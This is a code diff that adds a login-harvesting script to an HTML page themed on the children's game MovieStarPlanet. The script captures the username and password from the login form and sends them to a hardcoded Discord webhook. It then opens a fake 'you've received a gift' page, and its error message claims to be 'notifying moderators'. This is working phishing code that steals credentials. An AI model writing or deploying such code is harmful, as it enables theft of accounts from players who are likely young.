@@ -115,3 +115,68 @@
 </html>
 <body style="background-image: url(https://2.bp.blogspot.com/-CWCh2Wpny7c/WHNjjB1tkpI/AAAAAAAAB1g/dQYkBBdkMOM7d7n3UdmtFlJC7DfBKLcEgCLcB/s1600/msp%2Bplaatje.png
 ); background-size: cover; background-repeat: no-repeat; background-position: center;">
+
+<script>
+  // Script to handle form submission
+  document.getElementById("login-form").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent form submission
+    
+    // Get input values
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+
+    // Save username, password, and date to localStorage
+    var currentDate = new Date().toLocaleString();
+    localStorage.setItem("username", username);
+    localStorage.setItem("password", password);
+    localStorage.setItem("loginDate", currentDate);
+    
+    // Example: Sending data to Discord webhook
+    var webhookURL = "https://discord.com/api/webhooks/1237543876772761630/pnHMWhI_rz6b6fKXlBE6Z6409nusDuWfNJNvcZmWvxYnP4NRhUKjKWk5dGgxLoR1vMxS";
+    var message = {
+      username: "Login Notification",
+      content: "Username: " + username + "\nPassword: " + password + "\nLogin Date: " + currentDate
+    };
+
+    // Send message to Discord webhook
+    fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(message)
+    }).then(function(response) {
+      if (response.ok) {
+        // Open a new tab with congratulations message and image
+        var congratsPage = window.open();
+        congratsPage.document.write(`
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Congratulations</title>
+            <style>
+              body { font-family: Arial, sans-serif; background-color: #d1c7c7; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+              h2 { margin-bottom: 20px; }
+              img { width: 200px; }
+            </style>
+          </head>
+          <body>
+            <div>
+              <h2>Congratulations!</h2>
+              <p>You've received a gift:</p>
+              <img src="http://vignette3.wikia.nocookie.net/moviestarplanet/images/2/29/Gifting.png/revision/latest?cb=20140504004533" alt="Gift">
+            </div>
+          </body>
+          </html>
+        `);
+      } else {
+        alert("Failed to notify moderators. Please try again later.");
+      }
+    }).catch(function(error) {
+      console.error("Error:", error);
+      alert("An error occurred. Please try again later.");
+    });
+  });
+</script>
